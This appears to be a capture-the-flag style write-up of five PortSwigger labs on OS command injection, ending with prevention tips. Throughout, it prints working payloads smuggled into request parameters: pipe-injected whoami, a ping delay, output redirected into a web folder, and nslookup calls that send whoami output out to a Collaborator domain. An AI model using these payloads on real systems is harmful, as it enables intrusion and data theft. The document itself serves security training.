# OS Command Injection Writeup

**Author:** Ihtisham\
**Topic:** OS Command Injection\
**Platform:** PortSwigger Web Security Academy\
**Tools:** Burp Suite, Web Browser, Burp Collaborator

***

## Table of Contents

1. [Lab 1 — OS Command Injection, Simple Case](os-command-injection-writeup.md#lab-1--os-command-injection-simple-case)
2. [Lab 2 — Blind OS Command Injection with Time Delays](os-command-injection-writeup.md#lab-2--blind-os-command-injection-with-time-delays)
3. [Lab 3 — Blind OS Command Injection with Output Redirection](os-command-injection-writeup.md#lab-3--blind-os-command-injection-with-output-redirection)
4. [Lab 4 — Blind OS Command Injection with Out-of-Band Interaction](os-command-injection-writeup.md#lab-4--blind-os-command-injection-with-out-of-band-interaction)
5. [Lab 5 — Blind OS Command Injection with Out-of-Band Data Exfiltration](os-command-injection-writeup.md#lab-5--blind-os-command-injection-with-out-of-band-data-exfiltration)

***

## Before You Start

### What is OS Command Injection?

OS command injection happens when a web application passes user input directly to a system command without checking it. This lets an attacker run their own commands on the server.

For example, if a website checks stock by running:

```bash
stockreport.pl 381 29
```

And it takes the `381` from user input without filtering, an attacker can send `381|whoami` instead. The server then runs:

```bash
stockreport.pl 381|whoami 29
```

The `|` character tells the system: "also run `whoami`". Now the attacker knows the server's username.

### Direct vs Blind Injection

* **Direct (In-band):** The command output shows up in the server's response. Easy to see.
* **Blind:** The output does NOT show up in the response. You have to find other ways to confirm the command ran (time delays, writing to files, DNS lookups).

### Useful Characters for Injection

| Character | What it does                                         |
| --------- | ---------------------------------------------------- |
| \`        | \`                                                   |
| \`        |                                                      |
| `&&`      | Runs the next command only if the first one succeeds |
| `;`       | Runs the next command no matter what                 |
| `` ` ``   | Executes what's inside the backticks                 |
| `>`       | Writes command output to a file                      |

***

## Lab 1 — OS Command Injection, Simple Case

**Difficulty:** Apprentice\
**Type:** Direct (in-band) — we can see the output\
**Injection point:** Stock check feature — `storeId` parameter

### Goal

Run the `whoami` command on the server to find the current username.

### Steps

**Step 1:** Open the lab and go to any product page. At the bottom you'll see a "Check stock" button with a city dropdown.

![Product page showing the Check stock button and city dropdown](<../../.gitbook/assets/Unknown image (54)>)

When you click "Check stock", the application sends the product ID and store ID to the server. The server uses these in a system command.

**Step 2:** Click "Check stock" and intercept the request in Burp Suite. You'll see something like:

```
productId=1&storeId=1
```

Change the `storeId` to inject the `whoami` command using a pipe (`|`):

```
productId=1&storeId=1|whoami
```

Send the request.

![Burp Suite showing productId=1\&storeId=1|whoami — response shows peter-9G9vhA](<../../.gitbook/assets/Unknown image (55)>)

Look at the response on the right: it shows `peter-9G9vhA`. That's the server's username. The `whoami` command ran and the output came back directly in the response.

**Step 3:** The lab is automatically solved.

![Lab solved — OS command injection, simple case](<../../.gitbook/assets/Unknown image (56)>)

### Why did this work?

The server took our input (`1|whoami`) and put it directly into a shell command. The `|` character told the shell to also run `whoami`. Since the output came back in the HTTP response, we could see the result immediately.

***

## Lab 2 — Blind OS Command Injection with Time Delays

**Difficulty:** Practitioner\
**Type:** Blind — no output in the response\
**Injection point:** Feedback form — `email` parameter

### Goal

Prove that command injection works by causing a 10-second delay in the server's response.

### Why can't we just read the output?

The feedback form processes our input with a shell command, but the response is always a generic empty JSON `{}`. We never see any command output. So instead, we use `ping` to create a delay — if the response takes 10 seconds instead of 1 second, we know our command ran.

### Steps

**Step 1:** Go to the "Submit feedback" page. Fill in the form with any values. Click "Submit feedback" and intercept the request in Burp Suite.

**Step 2:** Change the `email` parameter to:

```
email=x||ping+-c+10+127.0.0.1||
```

What this does:

* `x` — dummy value (will fail as a command)
* `||` — "if the previous command fails, run the next one"
* `ping -c 10 127.0.0.1` — sends 10 pings to localhost, taking about 10 seconds
* `||` — prevents errors from whatever comes after in the server's command

(The `+` signs are URL-encoded spaces)

Send the request.

![Burp Suite showing the ping payload in the email parameter — response is 200 OK with empty JSON](<../../.gitbook/assets/Unknown image (57)>)

The response looks normal (200 OK, empty JSON body). But notice it took about **10 seconds** to come back. That delay proves the `ping` command executed on the server.

**Step 3:** The lab detects the delay and marks itself as solved.

![Lab solved — Blind OS command injection with time delays](<../../.gitbook/assets/Unknown image (58)>)

### Why did this work?

Even though we couldn't see any output, the 10-second delay confirmed our command ran. The `ping -c 10 127.0.0.1` command takes about 10 seconds to finish, which made the entire HTTP response take 10 seconds.

***

## Lab 3 — Blind OS Command Injection with Output Redirection

**Difficulty:** Practitioner\
**Type:** Blind — but we write output to a file we can read later\
**Injection point:** Feedback form — `email` parameter

### Goal

Run `whoami` and save its output to a file in a directory we can access through the web.

### The Idea

The server has a folder `/var/www/images/` that serves images to the website. If we redirect our command output into a file in this folder, we can read it through the browser using the image loading URL.

### Steps

**Step 1:** Go to "Submit feedback", fill in the form, intercept the request in Burp Suite.

Change the `email` parameter to:

```
email=||whoami > /var/www/images/output.txt||
```

What this does:

* `||whoami` — runs the `whoami` command
* `>` — redirects the output to a file instead of the screen
* `/var/www/images/output.txt` — saves it in the images directory (which is web-accessible)
* `||` — prevents syntax errors

Send the request.

![Burp Suite showing the output redirection payload — whoami output saved to /var/www/images/output.txt](<../../.gitbook/assets/Unknown image (59)>)

The response is a normal 200 OK. Behind the scenes, the `whoami` output was saved to `output.txt`.

**Step 2:** Now retrieve the file. The application loads images using this URL pattern:

```
GET /image?filename=output.txt
```

Send this request in Burp Suite.

![GET request to /image?filename=output.txt — response shows peter-uQjSLz](<../../.gitbook/assets/Unknown image (60)>)

The response shows `peter-uQjSLz` — that's the `whoami` output. We successfully read the command result by writing it to a file and then fetching that file.

**Step 3:** Submit the username. Lab solved.

![Lab solved — Blind OS command injection with output redirection](<../../.gitbook/assets/Unknown image (61)>)

### Why did this work?

We couldn't see command output in the response, but we could write it to a file in a folder the web server uses for images. Then we fetched that file through the normal image loading feature.

***

## Lab 4 — Blind OS Command Injection with Out-of-Band Interaction

**Difficulty:** Practitioner\
**Type:** Blind — we confirm execution via DNS lookup to Burp Collaborator\
**Injection point:** Feedback form — `email` parameter\
**Requires:** Burp Collaborator (Burp Suite Professional)

### Goal

Prove command injection works by making the server perform a DNS lookup to Burp Collaborator.

### What is Burp Collaborator?

Burp Collaborator gives you a unique domain name. When the target server performs a DNS lookup for that domain, Collaborator records it and shows it to you. This lets you confirm that your command executed — even when there's no output in the response and no writable directory available.

### Steps

**Step 1:** In Burp Suite, open the Collaborator tab and click "Copy to clipboard" to get your unique subdomain. It will look something like:

```
mrh31u9d2am6fxalug47kheprgx7lx9m.oastify.com
```

**Step 2:** Go to "Submit feedback", fill in the form, intercept the request in Burp Suite.

Change the `email` parameter to:

```
email=x||nslookup+x.mrh31u9d2am6fxalug47kheprgx7lx9m.oastify.com||
```

This makes the server run `nslookup` (a DNS lookup tool) against your Collaborator domain.

Send the request.

![Burp Suite showing the nslookup payload — server responds 200 OK](<../../.gitbook/assets/Unknown image (62)>)

**Step 3:** Go to the Collaborator tab and click "Poll now". You should see DNS interactions:

![Burp Collaborator showing DNS lookups from the target server — confirms command execution](<../../.gitbook/assets/Unknown image (63)>)

Collaborator received DNS lookups from the server. The description says: "The Collaborator server received a DNS lookup of type A for the domain name x.mrh31u9d2am6fxalug47kheprgx7lx9m.oastify.com." This proves the `nslookup` command ran on the server.

**Step 4:** Lab solved.

![Lab solved — Blind OS command injection with out-of-band interaction](<../../.gitbook/assets/Unknown image (64)>)

### Why did this work?

We made the server perform a DNS lookup to a domain we control (Burp Collaborator). When the lookup appeared in Collaborator, it proved our command executed. DNS is useful for this because DNS traffic is almost never blocked by firewalls.

***

## Lab 5 — Blind OS Command Injection with Out-of-Band Data Exfiltration

**Difficulty:** Practitioner\
**Type:** Blind — we extract data through DNS subdomains via Burp Collaborator\
**Injection point:** Feedback form — `email` parameter\
**Requires:** Burp Collaborator (Burp Suite Professional)

### Goal

Run `whoami` and get the result sent to Burp Collaborator through a DNS lookup.

### The Trick

In Lab 4, we just confirmed command execution. Now we want to actually **read the output**. The trick is to embed the command output inside the DNS domain name.

If we run:

```bash
nslookup `whoami`.our-collaborator-domain.com
```

The backticks make the shell run `whoami` first. If `whoami` returns `peter`, the command becomes:

```bash
nslookup peter.our-collaborator-domain.com
```

Collaborator receives a DNS lookup for `peter.our-collaborator-domain.com` — and we can read `peter` from the subdomain.

### Steps

**Step 1:** Go to "Submit feedback". The feedback form has Name, Email, Subject, and Message fields.

![Feedback form with Name, Email, Subject, and Message fields](<../../.gitbook/assets/Unknown image (65)>)

**Step 2:** Fill in the form and intercept the request in Burp Suite. Get your Collaborator subdomain from the Collaborator tab.

Change the `email` parameter to:

```
email=ihtisham@email.com||nslookup+`whoami`.rc7wsrqrce64h8cgienaa1lpsgy7mxam.oastify.com||
```

What this does:

* `` `whoami` `` — the backticks run `whoami` and replace themselves with the output
* The result gets embedded as a subdomain in the DNS lookup
* Collaborator receives the lookup and we can read the username from it

Send the request.

![Burp Suite showing the exfiltration payload with backtick whoami in the DNS subdomain](<../../.gitbook/assets/Unknown image (66)>)

**Step 3:** Go to Collaborator and click "Poll now".

![Collaborator showing DNS lookup — subdomain contains peter-oV5S0n which is the whoami output](<../../.gitbook/assets/Unknown image (67)>)

Look at the description: "The Collaborator server received a DNS lookup of type A for the domain name **peter-oV5S0n**.rc7wsrqrce64h8cgienaa1lpsgy7mxam.oastify.com."

The subdomain `peter-oV5S0n` is the output of `whoami`. We successfully extracted data from a blind injection through DNS.

**Step 4:** Submit `peter-oV5S0n` as the answer. Lab solved.

![Lab solved — Blind OS command injection with out-of-band data exfiltration](<../../.gitbook/assets/Unknown image (68)>)

### Why did this work?

We embedded the `whoami` output inside a DNS domain name using backtick command substitution. When the server performed the DNS lookup, the username traveled through DNS to our Collaborator server, where we could read it.

***

## Quick Reference

| Lab | Type   | Where to inject | Payload                                       | How we get the result             |
| --- | ------ | --------------- | --------------------------------------------- | --------------------------------- |
| 1   | Direct | `storeId` param | `1\|whoami`                                   | Output in the HTTP response       |
| 2   | Blind  | `email` param   | `x\|\|ping -c 10 127.0.0.1\|\|`               | 10-second delay proves it worked  |
| 3   | Blind  | `email` param   | `\|\|whoami > /var/www/images/output.txt\|\|` | Read the file through the website |
| 4   | Blind  | `email` param   | `x\|\|nslookup x.COLLABORATOR\|\|`            | DNS hit in Collaborator           |
| 5   | Blind  | `email` param   | `\|\|nslookup \`whoami\`.COLLABORATOR\|\|\`   | Username appears as DNS subdomain |

***

## How to Prevent OS Command Injection

1. **Don't use shell commands** — Use your programming language's built-in functions instead of calling system commands.
2. **If you must use commands, don't include user input** — Keep user data separate from command strings.
3. **Whitelist input** — If a parameter should be a number, only accept digits. Reject everything else.
4. **Run with low privileges** — The application should use a restricted user account with minimal permissions.

***

> **Disclaimer:** This writeup is for educational purposes only. All labs were done on PortSwigger's intentionally vulnerable platform. Don't try this on real systems without permission.
